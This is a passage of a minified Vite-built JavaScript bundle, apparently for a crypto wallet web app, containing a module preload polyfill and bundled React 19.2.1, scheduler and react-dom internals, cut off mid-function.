const __vite__mapDeps=(i,m=__vite__mapDeps,d=(m.f||(m.f=["assets/index-vPdMErzc.js","assets/parseSignature-5lHpgem0.js","assets/hashTypedData-BzjRq8Na.js","assets/email-BbUlwiWw.js","assets/index-B_1A7FBw.js","assets/swaps-BJdMrTjq.js","assets/SwapController-DSF8V2wc.js","assets/index-Du_puW6V.js","assets/send-BSibdpJl.js","assets/index-BxrCmbIt.js","assets/pay-with-exchange-B3YX91F0.js","assets/index-29W-9EAT.js","assets/index-C45qUmwh.js","assets/data-capture-rXOU-mxN.js","assets/features-CwVTngeI.js","assets/w3m-modal-BPuMoZ3T.js","assets/PhArrowCircleDown-BtlNV0TZ.js","assets/property-CnFDNXw5.js","assets/PhArrowClockwise-mOiWYLMV.js","assets/PhArrowDown-CkoOD89h.js","assets/PhArrowLeft-C0jlxVhM.js","assets/PhArrowRight-BI-V03Xf.js","assets/PhArrowSquareOut-DnQ7n_B4.js","assets/PhArrowsDownUp-PZosTqZG.js","assets/PhArrowsLeftRight-CYsRQ2qh.js","assets/PhArrowUp-izKvURUW.js","assets/PhArrowUpRight-Bn-JhHsY.js","assets/PhArrowsClockwise-Brtx2Re-.js","assets/PhBank-hhPAIPVb.js","assets/PhBrowser-BjzAmrHO.js","assets/PhCaretDown-ddSjwcwm.js","assets/PhCaretLeft-B7YLoNEF.js","assets/PhCaretRight-BY8D5MIg.js","assets/PhCaretUp-BG10nSut.js","assets/PhCheck-DrKd7pBC.js","assets/PhCircleHalf-Bk9C4DvT.js","assets/PhClock-Sj17weCB.js","assets/PhCompass-Df1ugFO-.js","assets/PhCopy-rgttky8E.js","assets/PhCreditCard-CZpdid2n.js","assets/PhCurrencyDollar-B6IKKjue.js","assets/PhDesktop-BuCDXYJj.js","assets/PhDeviceMobile-CnybhXY-.js","assets/PhDotsThree-CSAEcba1.js","assets/PhVault-B8m1usHw.js","assets/PhEnvelope-SmaNeXoQ.js","assets/PhFunnelSimple-DKx35ITq.js","assets/PhGlobe-q1mqj65V.js","assets/PhIdentificationCard-BeLXJpfZ.js","assets/PhImage-BYrKfN9k.js","assets/PhInfo-X33f06Ej.js","assets/PhLightbulb-DMZJsowR.js","assets/PhMagnifyingGlass-B6D0sWFL.js","assets/PhPaperPlaneRight-Dvo-nXr9.js","assets/PhPlus-CBvZvLax.js","assets/PhPower-D8-AcNM6.js","assets/PhPuzzlePiece-C-7mYqGO.js","assets/PhQrCode-uIXlI5ER.js","assets/PhQuestion-rUoqC2sC.js","assets/PhQuestionMark-W55Txvvb.js","assets/PhSealCheck-BeVLq9PH.js","assets/PhSignOut-Cq2PivQ6.js","assets/PhSpinner-CZMtAFdX.js","assets/PhTrash-BamrmMsN.js","assets/PhUser-A2fxqIV0.js","assets/PhWarning-CpkID9oi.js","assets/PhWarningCircle-Cm58gXb9.js","assets/PhX-C3b4cCEy.js","assets/index-CZ88CzCk.js","assets/index-CHgVnNch.js"])))=>i.map(i=>d[i]);
(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function n(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function r(i){if(i.ep)return;i.ep=!0;const s=n(i);fetch(i.href,s)}})();var Nl=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function Vf(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}function gre(t){if(Object.prototype.hasOwnProperty.call(t,"__esModule"))return t;var e=t.default;if(typeof e=="function"){var n=function r(){var i=!1;try{i=this instanceof r}catch{}return i?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};n.prototype=e.prototype}else n={};return Object.defineProperty(n,"__esModule",{value:!0}),Object.keys(t).forEach(function(r){var i=Object.getOwnPropertyDescriptor(t,r);Object.defineProperty(n,r,i.get?i:{enumerable:!0,get:function(){return t[r]}})}),n}var yN={exports:{}},pv={};var U$;function f0e(){if(U$)return pv;U$=1;var t=Symbol.for("react.transitional.element"),e=Symbol.for("react.fragment");function n(r,i,s){var o=null;if(s!==void 0&&(o=""+s),i.key!==void 0&&(o=""+i.key),"key"in i){s={};for(var a in i)a!=="key"&&(s[a]=i[a])}else s=i;return i=s.ref,{$$typeof:t,type:r,key:o,ref:i!==void 0?i:null,props:s}}return pv.Fragment=e,pv.jsx=n,pv.jsxs=n,pv}var L$;function h0e(){return L$||(L$=1,yN.exports=f0e()),yN.exports}var ae=h0e(),bN={exports:{}},Vt={};var F$;function p0e(){if(F$)return Vt;F$=1;var t=Symbol.for("react.transitional.element"),e=Symbol.for("react.portal"),n=Symbol.for("react.fragment"),r=Symbol.for("react.strict_mode"),i=Symbol.for("react.profiler"),s=Symbol.for("react.consumer"),o=Symbol.for("react.context"),a=Symbol.for("react.forward_ref"),c=Symbol.for("react.suspense"),l=Symbol.for("react.memo"),f=Symbol.for("react.lazy"),h=Symbol.for("react.activity"),m=Symbol.iterator;function b(L){return L===null||typeof L!="object"?null:(L=m&&L[m]||L["@@iterator"],typeof L=="function"?L:null)}var w={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},y=Object.assign,E={};function A(L,V,G){this.props=L,this.context=V,this.refs=E,this.updater=G||w}A.prototype.isReactComponent={},A.prototype.setState=function(L,V){if(typeof L!="object"&&typeof L!="function"&&L!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,L,V,"setState")},A.prototype.forceUpdate=function(L){this.updater.enqueueForceUpdate(this,L,"forceUpdate")};function R(){}R.prototype=A.prototype;function S(L,V,G){this.props=L,this.context=V,this.refs=E,this.updater=G||w}var v=S.prototype=new R;v.constructor=S,y(v,A.prototype),v.isPureReactComponent=!0;var k=Array.isArray;function O(){}var _={H:null,A:null,T:null,S:null},I=Object.prototype.hasOwnProperty;function T(L,V,G){var Z=G.ref;return{$$typeof:t,type:L,key:V,ref:Z!==void 0?Z:null,props:G}}function B(L,V){return T(L.type,V,L.props)}function U(L){return typeof L=="object"&&L!==null&&L.$$typeof===t}function M(L){var V={"=":"=0",":":"=2"};return"$"+L.replace(/[=:]/g,function(G){return V[G]})}var N=/\/+/g;function q(L,V){return typeof L=="object"&&L!==null&&L.key!=null?M(""+L.key):V.toString(36)}function P(L){switch(L.status){case"fulfilled":return L.value;case"rejected":throw L.reason;default:switch(typeof L.status=="string"?L.then(O,O):(L.status="pending",L.then(function(V){L.status==="pending"&&(L.status="fulfilled",L.value=V)},function(V){L.status==="pending"&&(L.status="rejected",L.reason=V)})),L.status){case"fulfilled":return L.value;case"rejected":throw L.reason}}throw L}function C(L,V,G,Z,J){var ne=typeof L;(ne==="undefined"||ne==="boolean")&&(L=null);var re=!1;if(L===null)re=!0;else switch(ne){case"bigint":case"string":case"number":re=!0;break;case"object":switch(L.$$typeof){case t:case e:re=!0;break;case f:return re=L._init,C(re(L._payload),V,G,Z,J)}}if(re)return J=J(L),re=Z===""?"."+q(L,0):Z,k(J)?(G="",re!=null&&(G=re.replace(N,"$&/")+"/"),C(J,V,G,"",function(ue){return ue})):J!=null&&(U(J)&&(J=B(J,G+(J.key==null||L&&L.key===J.key?"":(""+J.key).replace(N,"$&/")+"/")+re)),V.push(J)),1;re=0;var le=Z===""?".":Z+":";if(k(L))for(var oe=0;oe<L.length;oe++)Z=L[oe],ne=le+q(Z,oe),re+=C(Z,V,G,ne,J);else if(oe=b(L),typeof oe=="function")for(L=oe.call(L),oe=0;!(Z=L.next()).done;)Z=Z.value,ne=le+q(Z,oe++),re+=C(Z,V,G,ne,J);else if(ne==="object"){if(typeof L.then=="function")return C(P(L),V,G,Z,J);throw V=String(L),Error("Objects are not valid as a React child (found: "+(V==="[object Object]"?"object with keys {"+Object.keys(L).join(", ")+"}":V)+"). If you meant to render a collection of children, use an array instead.")}return re}function j(L,V,G){if(L==null)return L;var Z=[],J=0;return C(L,Z,"","",function(ne){return V.call(G,ne,J++)}),Z}function z(L){if(L._status===-1){var V=L._result;V=V(),V.then(function(G){(L._status===0||L._status===-1)&&(L._status=1,L._result=G)},function(G){(L._status===0||L._status===-1)&&(L._status=2,L._result=G)}),L._status===-1&&(L._status=0,L._result=V)}if(L._status===1)return L._result.default;throw L._result}var $=typeof reportError=="function"?reportError:function(L){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var V=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof L=="object"&&L!==null&&typeof L.message=="string"?String(L.message):String(L),error:L});if(!window.dispatchEvent(V))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",L);return}console.error(L)},H={map:j,forEach:function(L,V,G){j(L,function(){V.apply(this,arguments)},G)},count:function(L){var V=0;return j(L,function(){V++}),V},toArray:function(L){return j(L,function(V){return V})||[]},only:function(L){if(!U(L))throw Error("React.Children.only expected to receive a single React element child.");return L}};return Vt.Activity=h,Vt.Children=H,Vt.Component=A,Vt.Fragment=n,Vt.Profiler=i,Vt.PureComponent=S,Vt.StrictMode=r,Vt.Suspense=c,Vt.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=_,Vt.__COMPILER_RUNTIME={__proto__:null,c:function(L){return _.H.useMemoCache(L)}},Vt.cache=function(L){return function(){return L.apply(null,arguments)}},Vt.cacheSignal=function(){return null},Vt.cloneElement=function(L,V,G){if(L==null)throw Error("The argument must be a React element, but you passed "+L+".");var Z=y({},L.props),J=L.key;if(V!=null)for(ne in V.key!==void 0&&(J=""+V.key),V)!I.call(V,ne)||ne==="key"||ne==="__self"||ne==="__source"||ne==="ref"&&V.ref===void 0||(Z[ne]=V[ne]);var ne=arguments.length-2;if(ne===1)Z.children=G;else if(1<ne){for(var re=Array(ne),le=0;le<ne;le++)re[le]=arguments[le+2];Z.children=re}return T(L.type,J,Z)},Vt.createContext=function(L){return L={$$typeof:o,_currentValue:L,_currentValue2:L,_threadCount:0,Provider:null,Consumer:null},L.Provider=L,L.Consumer={$$typeof:s,_context:L},L},Vt.createElement=function(L,V,G){var Z,J={},ne=null;if(V!=null)for(Z in V.key!==void 0&&(ne=""+V.key),V)I.call(V,Z)&&Z!=="key"&&Z!=="__self"&&Z!=="__source"&&(J[Z]=V[Z]);var re=arguments.length-2;if(re===1)J.children=G;else if(1<re){for(var le=Array(re),oe=0;oe<re;oe++)le[oe]=arguments[oe+2];J.children=le}if(L&&L.defaultProps)for(Z in re=L.defaultProps,re)J[Z]===void 0&&(J[Z]=re[Z]);return T(L,ne,J)},Vt.createRef=function(){return{current:null}},Vt.forwardRef=function(L){return{$$typeof:a,render:L}},Vt.isValidElement=U,Vt.lazy=function(L){return{$$typeof:f,_payload:{_status:-1,_result:L},_init:z}},Vt.memo=function(L,V){return{$$typeof:l,type:L,compare:V===void 0?null:V}},Vt.startTransition=function(L){var V=_.T,G={};_.T=G;try{var Z=L(),J=_.S;J!==null&&J(G,Z),typeof Z=="object"&&Z!==null&&typeof Z.then=="function"&&Z.then(O,$)}catch(ne){$(ne)}finally{V!==null&&G.types!==null&&(V.types=G.types),_.T=V}},Vt.unstable_useCacheRefresh=function(){return _.H.useCacheRefresh()},Vt.use=function(L){return _.H.use(L)},Vt.useActionState=function(L,V,G){return _.H.useActionState(L,V,G)},Vt.useCallback=function(L,V){return _.H.useCallback(L,V)},Vt.useContext=function(L){return _.H.useContext(L)},Vt.useDebugValue=function(){},Vt.useDeferredValue=function(L,V){return _.H.useDeferredValue(L,V)},Vt.useEffect=function(L,V){return _.H.useEffect(L,V)},Vt.useEffectEvent=function(L){return _.H.useEffectEvent(L)},Vt.useId=function(){return _.H.useId()},Vt.useImperativeHandle=function(L,V,G){return _.H.useImperativeHandle(L,V,G)},Vt.useInsertionEffect=function(L,V){return _.H.useInsertionEffect(L,V)},Vt.useLayoutEffect=function(L,V){return _.H.useLayoutEffect(L,V)},Vt.useMemo=function(L,V){return _.H.useMemo(L,V)},Vt.useOptimistic=function(L,V){return _.H.useOptimistic(L,V)},Vt.useReducer=function(L,V,G){return _.H.useReducer(L,V,G)},Vt.useRef=function(L){return _.H.useRef(L)},Vt.useState=function(L){return _.H.useState(L)},Vt.useSyncExternalStore=function(L,V,G){return _.H.useSyncExternalStore(L,V,G)},Vt.useTransition=function(){return _.H.useTransition()},Vt.version="19.2.1",Vt}var $$;function YD(){return $$||($$=1,bN.exports=p0e()),bN.exports}var un=YD();const jI=Vf(un);var wN={exports:{}},mv={},vN={exports:{}},EN={};var H$;function m0e(){return H$||(H$=1,(function(t){function e(C,j){var z=C.length;C.push(j);e:for(;0<z;){var $=z-1>>>1,H=C[$];if(0<i(H,j))C[$]=j,C[z]=H,z=$;else break e}}function n(C){return C.length===0?null:C[0]}function r(C){if(C.length===0)return null;var j=C[0],z=C.pop();if(z!==j){C[0]=z;e:for(var $=0,H=C.length,L=H>>>1;$<L;){var V=2*($+1)-1,G=C[V],Z=V+1,J=C[Z];if(0>i(G,z))Z<H&&0>i(J,G)?(C[$]=J,C[Z]=z,$=Z):(C[$]=G,C[V]=z,$=V);else if(Z<H&&0>i(J,z))C[$]=J,C[Z]=z,$=Z;else break e}}return j}function i(C,j){var z=C.sortIndex-j.sortIndex;return z!==0?z:C.id-j.id}if(t.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var s=performance;t.unstable_now=function(){return s.now()}}else{var o=Date,a=o.now();t.unstable_now=function(){return o.now()-a}}var c=[],l=[],f=1,h=null,m=3,b=!1,w=!1,y=!1,E=!1,A=typeof setTimeout=="function"?setTimeout:null,R=typeof clearTimeout=="function"?clearTimeout:null,S=typeof setImmediate<"u"?setImmediate:null;function v(C){for(var j=n(l);j!==null;){if(j.callback===null)r(l);else if(j.startTime<=C)r(l),j.sortIndex=j.expirationTime,e(c,j);else break;j=n(l)}}function k(C){if(y=!1,v(C),!w)if(n(c)!==null)w=!0,O||(O=!0,M());else{var j=n(l);j!==null&&P(k,j.startTime-C)}}var O=!1,_=-1,I=5,T=-1;function B(){return E?!0:!(t.unstable_now()-T<I)}function U(){if(E=!1,O){var C=t.unstable_now();T=C;var j=!0;try{e:{w=!1,y&&(y=!1,R(_),_=-1),b=!0;var z=m;try{t:{for(v(C),h=n(c);h!==null&&!(h.expirationTime>C&&B());){var $=h.callback;if(typeof $=="function"){h.callback=null,m=h.priorityLevel;var H=$(h.expirationTime<=C);if(C=t.unstable_now(),typeof H=="function"){h.callback=H,v(C),j=!0;break t}h===n(c)&&r(c),v(C)}else r(c);h=n(c)}if(h!==null)j=!0;else{var L=n(l);L!==null&&P(k,L.startTime-C),j=!1}}break e}finally{h=null,m=z,b=!1}j=void 0}}finally{j?M():O=!1}}}var M;if(typeof S=="function")M=function(){S(U)};else if(typeof MessageChannel<"u"){var N=new MessageChannel,q=N.port2;N.port1.onmessage=U,M=function(){q.postMessage(null)}}else M=function(){A(U,0)};function P(C,j){_=A(function(){C(t.unstable_now())},j)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(C){C.callback=null},t.unstable_forceFrameRate=function(C){0>C||125<C?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):I=0<C?Math.floor(1e3/C):5},t.unstable_getCurrentPriorityLevel=function(){return m},t.unstable_next=function(C){switch(m){case 1:case 2:case 3:var j=3;break;default:j=m}var z=m;m=j;try{return C()}finally{m=z}},t.unstable_requestPaint=function(){E=!0},t.unstable_runWithPriority=function(C,j){switch(C){case 1:case 2:case 3:case 4:case 5:break;default:C=3}var z=m;m=C;try{return j()}finally{m=z}},t.unstable_scheduleCallback=function(C,j,z){var $=t.unstable_now();switch(typeof z=="object"&&z!==null?(z=z.delay,z=typeof z=="number"&&0<z?$+z:$):z=$,C){case 1:var H=-1;break;case 2:H=250;break;case 5:H=1073741823;break;case 4:H=1e4;break;default:H=5e3}return H=z+H,C={id:f++,callback:j,priorityLevel:C,startTime:z,expirationTime:H,sortIndex:-1},z>$?(C.sortIndex=z,e(l,C),n(c)===null&&C===n(l)&&(y?(R(_),_=-1):y=!0,P(k,z-$))):(C.sortIndex=H,e(c,C),w||b||(w=!0,O||(O=!0,M()))),C},t.unstable_shouldYield=B,t.unstable_wrapCallback=function(C){var j=m;return function(){var z=m;m=j;try{return C.apply(this,arguments)}finally{m=z}}}})(EN)),EN}var z$;function g0e(){return z$||(z$=1,vN.exports=m0e()),vN.exports}var _N={exports:{}},Us={};var q$;function y0e(){if(q$)return Us;q$=1;var t=YD();function e(c){var l="https://react.dev/errors/"+c;if(1<arguments.length){l+="?args[]="+encodeURIComponent(arguments[1]);for(var f=2;f<arguments.length;f++)l+="&args[]="+encodeURIComponent(arguments[f])}return"Minified React error #"+c+"; visit "+l+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function n(){}var r={d:{f:n,r:function(){throw Error(e(522))},D:n,C:n,L:n,m:n,X:n,S:n,M:n},p:0,findDOMNode:null},i=Symbol.for("react.portal");function s(c,l,f){var h=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:i,key:h==null?null:""+h,children:c,containerInfo:l,implementation:f}}var o=t.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function a(c,l){if(c==="font")return"";if(typeof l=="string")return l==="use-credentials"?l:""}return Us.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=r,Us.createPortal=function(c,l){var f=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!l||l.nodeType!==1&&l.nodeType!==9&&l.nodeType!==11)throw Error(e(299));return s(c,l,null,f)},Us.flushSync=function(c){var l=o.T,f=r.p;try{if(o.T=null,r.p=2,c)return c()}finally{o.T=l,r.p=f,r.d.f()}},Us.preconnect=function(c,l){typeof c=="string"&&(l?(l=l.crossOrigin,l=typeof l=="string"?l==="use-credentials"?l:"":void 0):l=null,r.d.C(c,l))},Us.prefetchDNS=function(c){typeof c=="string"&&r.d.D(c)},Us.preinit=function(c,l){if(typeof c=="string"&&l&&typeof l.as=="string"){var f=l.as,h=a(f,l.crossOrigin),m=typeof l.integrity=="string"?l.integrity:void 0,b=typeof l.fetchPriority=="string"?l.fetchPriority:void 0;f==="style"?r.d.S(c,typeof l.precedence=="string"?l.precedence:void 0,{crossOrigin:h,integrity:m,fetchPriority:b}):f==="script"&&r.d.X(c,{crossOrigin:h,integrity:m,fetchPriority:b,nonce:typeof l.nonce=="string"?l.nonce:void 0})}},Us.preinitModule=function(c,l){if(typeof c=="string")if(typeof l=="object"&&l!==null){if(l.as==null||l.as==="script"){var f=a(l.as,l.crossOrigin);r.d.M(c,{crossOrigin:f,integrity:typeof l.integrity=="string"?l.integrity:void 0,nonce:typeof l.nonce=="string"?l.nonce:void 0})}}else l==null&&r.d.M(c)},Us.preload=function(c,l){if(typeof c=="string"&&typeof l=="object"&&l!==null&&typeof l.as=="string"){var f=l.as,h=a(f,l.crossOrigin);r.d.L(c,f,{crossOrigin:h,integrity:typeof l.integrity=="string"?l.integrity:void 0,nonce:typeof l.nonce=="string"?l.nonce:void 0,type:typeof l.type=="string"?l.type:void 0,fetchPriority:typeof l.fetchPriority=="string"?l.fetchPriority:void 0,referrerPolicy:typeof l.referrerPolicy=="string"?l.referrerPolicy:void 0,imageSrcSet:typeof l.imageSrcSet=="string"?l.imageSrcSet:void 0,imageSizes:typeof l.imageSizes=="string"?l.imageSizes:void 0,media:typeof l.media=="string"?l.media:void 0})}},Us.preloadModule=function(c,l){if(typeof c=="string")if(l){var f=a(l.as,l.crossOrigin);r.d.m(c,{as:typeof l.as=="string"&&l.as!=="script"?l.as:void 0,crossOrigin:f,integrity:typeof l.integrity=="string"?l.integrity:void 0})}else r.d.m(c)},Us.requestFormReset=function(c){r.d.r(c)},Us.unstable_batchedUpdates=function(c,l){return c(l)},Us.useFormState=function(c,l,f){return o.H.useFormState(c,l,f)},Us.useFormStatus=function(){return o.H.useHostTransitionStatus()},Us.version="19.2.1",Us}var V$;function b0e(){if(V$)return _N.exports;V$=1;function t(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(t)}catch(e){console.error(e)}}return t(),_N.exports=y0e(),_N.exports}var W$;function w0e(){if(W$)return mv;W$=1;var t=g0e(),e=YD(),n=b0e();function r(u){var d="https://react.dev/errors/"+u;if(1<arguments.length){d+="?args[]="+encodeURIComponent(arguments[1]);for(var p=2;p<arguments.length;p++)d+="&args[]="+encodeURIComponent(arguments[p])}return"Minified React error #"+u+"; visit "+d+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function i(u){return!(!u||u.nodeType!==1&&u.nodeType!==9&&u.nodeType!==11)}function s(u){var d=u,p=u;if(u.alternate)for(;d.return;)d=d.return;else{u=d;do d=u,(d.flags&4098)!==0&&(p=d.return),u=d.return;while(u)}return d.tag===3?p:null}function o(u){if(u.tag===13){var d=u.memoizedState;if(d===null&&(u=u.alternate,u!==null&&(d=u.memoizedState)),d!==null)return d.dehydrated}return null}function a(u){if(u.tag===31){var d=u.memoizedState;if(d===null&&(u=u.alternate,u!==null&&(d=u.memoizedState)),d!==null)return d.dehydrated}return null}function c(u){if(s(u)!==u)throw Error(r(188))}function l(u){var d=u.alternate;if(!d){if(d=s(u),d===null)throw Error(r(188));return d!==u?null:u}for(var p=u,g=d;;){var D=p.return;if(D===null)break;var F=D.alternate;if(F===null){if(g=D.return,g!==null){p=g;continue}break}if(D.child===F.child){for(F=D.child;F;){if(F===p)return c(D),u;if(F===g)return c(D),d;F=F.sibling}throw Error(r(188))}if(p.return!==g.return)p=D,g=F;else{for(var K=!1,te=D.child;te;){if(te===p){K=!0,p=D,g=F;break}if(te===g){K=!0,g=D,p=F;break}te=te.sibling}if(!K){for(te=F.child;te;){if(te===p){K=!0,p=F,g=D;break}if(te===g){K=!0,g=F,p=D;break}te=te.sibling}if(!K)throw Error(r(189))}}if(p.alternate!==g)throw Error(r(190))}if(p.tag!==3)throw Error(r(188));return p.stateNode.current===p?u:d}function f(u){var d=u.tag;if(d===5||d===26||d===27||d===6)return u;for(u=u.child;u!==null;){if(d=f(u),d!==null)return d;u=u.sibling}return null}var h=Object.assign,m=Symbol.for("react.element"),b=Symbol.for("react.transitional.element"),w=Symbol.for("react.portal"),y=Symbol.for("react.fragment"),E=Symbol.for("react.strict_mode"),A=Symbol.for("react.profiler"),R=Symbol.for("react.consumer"),S=Symbol.for("react.context"),v=Symbol.for("react.forward_ref"),k=Symbol.for("react.suspense"),O=Symbol.for("react.suspense_list"),_=Symbol.for("react.memo"),I=Symbol.for("react.lazy"),T=Symbol.for("react.activity"),B=Symbol.for("react.memo_cache_sentinel"),U=Symbol.iterator;function M(u){return u===null||typeof u!="object"?null:(u=U&&u[U]||u["@@iterator"],typeof u=="function"?u:null)}var N=Symbol.for("react.client.reference");function q(u){if(u==null)return null;if(typeof u=="function")return u.$$typeof===N?null:u.displayName||u.name||null;if(typeof u=="string")return u;switch(u){case y:return"Fragment";case A:return"Profiler";case E:return"StrictMode";case k:return"Suspense";case O:return"SuspenseList";case T:return"Activity"}if(typeof u=="object")switch(u.$$typeof){case w:return"Portal";case S:return u.displayName||"Context";case R:return(u._context.displayName||"Context")+".Consumer";case v:var d=u.render;return u=u.displayName,u||(u=d.displayName||d.name||"",u=u!==""?"ForwardRef("+u+")":"ForwardRef"),u;case _:return d=u.displayName||null,d!==null?d:q(u.type)||"Memo";case I:d=u._payload,u=u._init;try{return q(u(d))}catch{}}return null}var P=Array.isArray,C=e.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,j=n.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,z={pending:!1,data:null,method:null,action:null},$=[],H=-1;function L(u){return{current:u}}function V(u){0>H||(u.current=$[H],$[H]=null,H--)}function G(u,d){H++,$[H]=u.current,u.current=d}var Z=L(null),J=L(null),ne=L(null),re=L(null);function le(u,d){switch(G(ne,d),G(J,u),G(Z,null),d.nodeType){case 9:case 11:u=(u=d.documentElement)&&(u=u.namespaceURI)?a$(u):0;break;default:if(u=d.tagName,d=d.namespaceURI)d=a$(d),u=c$(d,u);else switch(u){case"svg":u=1;break;case"math":u=2;break;default:u=0}}V(Z),G(Z,u)}function oe(){V(Z),V(J),V(ne)}function ue(u){u.memoizedState!==null&&G(re,u);var d=Z.current,p=c$(d,u.type);d!==p&&(G(J,u),G(Z,p))}function be(u){J.current===u&&(V(Z),V(J)),re.current===u&&(V(re),lv._currentValue=z)}var Me,Te;function Oe(u){if(Me===void 0)try{throw Error()}catch(p){var d=p.stack.trim().match(/\n( *(at )?)/);Me=d&&d[1]||"",Te=-1<p.stack.indexOf(`
    at`)?" (<anonymous>)":-1<p.stack.indexOf("@")?"@unknown:0:0":""}return`
`+Me+u+Te}var Ke=!1;function it(u,d){if(!u||Ke)return"";Ke=!0;var p=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var g={DetermineComponentFrameRoot:function(){try{if(d){var Le=function(){throw Error()};if(Object.defineProperty(Le.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(Le,[])}catch(Pe){var Se=Pe}Reflect.construct(u,[],Le)}else{try{Le.call()}catch(Pe){Se=Pe}u.call(Le.prototype)}}else{try{throw Error()}catch(Pe){Se=Pe}(Le=u())&&typeof Le.catch=="function"&&Le.catch(function(){})}}catch(Pe){if(Pe&&Se&&typeof Pe.stack=="string")return[Pe.stack,Se.stack]}return[null,null]}};g.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var D=Object.getOwnPropertyDescriptor(g.DetermineComponentFrameRoot,"name");D&&D.configurable&&Object.defineProperty(g.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var F=g.DetermineComponentFrameRoot(),K=F[0],te=F[1];if(K&&te){var ce=K.split(`
`),Ae=te.split(`
`);for(D=g=0;g<ce.length&&!ce[g].includes("DetermineComponentFrameRoot");)g++;for(;D<Ae.length&&!Ae[D].includes("DetermineComponentFrameRoot");)D++;if(g===ce.length||D===Ae.length)for(g=ce.length-1,D=Ae.length-1;1<=g&&0<=D&&ce[g]!==Ae[D];)D--;for(;1<=g&&0<=D;g--,D--)if(ce[g]!==Ae[D]){if(g!==1||D!==1)do if(g--,D--,0>D||ce[g]!==Ae[D]){var De=`
`+ce[g].replace(" at new "," at ");return u.displayName&&De.includes("<anonymous>")&&(De=De.replace("<anonymous>",u.displayName)),De}while(1<=g&&0<=D);break}}}finally{Ke=!1,Error.prepareStackTrace=p}return(p=u?u.displayName||u.name:"")?Oe(p):""}function at(u,d){switch(u.tag){case 26:case 27:case 5:return Oe(u.type);case 16:return Oe("Lazy");case 13:return u.child!==d&&d!==null?Oe("Suspense Fallback"):Oe("Suspense");case 19:return Oe("SuspenseList");case 0:case 15:return it(u.type,!1);case 11:return it(u.type.render,!1);case 1:return it(u.type,!0);case 31:return Oe("Activity");default:return""}}function At(u){try{var d="",p=null;do d+=at(u,p),p=u,u=u.return;while(u);return d}catch(g){return`
Error generating stack: `+g.message+`
`+g.stack}}var Et=Object.prototype.hasOwnProperty,ze=t.unstable_scheduleCallback,Re=t.unstable_cancelCallback,xn=t.unstable_shouldYield,Ln=t.unstable_requestPaint,Nn=t.unstable_now,Ne=t.unstable_getCurrentPriorityLevel,Ve=t.unstable_ImmediatePriority,Qe=t.unstable_UserBlockingPriority,dt=t.unstable_NormalPriority,cr=t.unstable_LowPriority,ui=t.unstable_IdlePriority,ks=t.log,eo=t.unstable_setDisableYieldValue,Hr=null,xr=null;function Vi(u){if(typeof ks=="function"&&eo(u),xr&&typeof xr.setStrictMode=="function")try{xr.setStrictMode(Hr,u)}catch{}}var br=Math.clz32?Math.clz32:th,ic=Math.log,Xc=Math.LN2;function th(u){return u>>>=0,u===0?32:31-(ic(u)/Xc|0)|0}var To=256,sc=262144,wr=4194304;function xo(u){var d=u&42;if(d!==0)return d;switch(u&-u){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return u&261888;case 262144:case 524288:case 1048576:case 2097152:return u&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return u&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return u}}function Io(u,d,p){var g=u.pendingLanes;if(g===0)return 0;var D=0,F=u.suspendedLanes,K=u.pingedLanes;u=u.warmLanes;var te=g&134217727;return 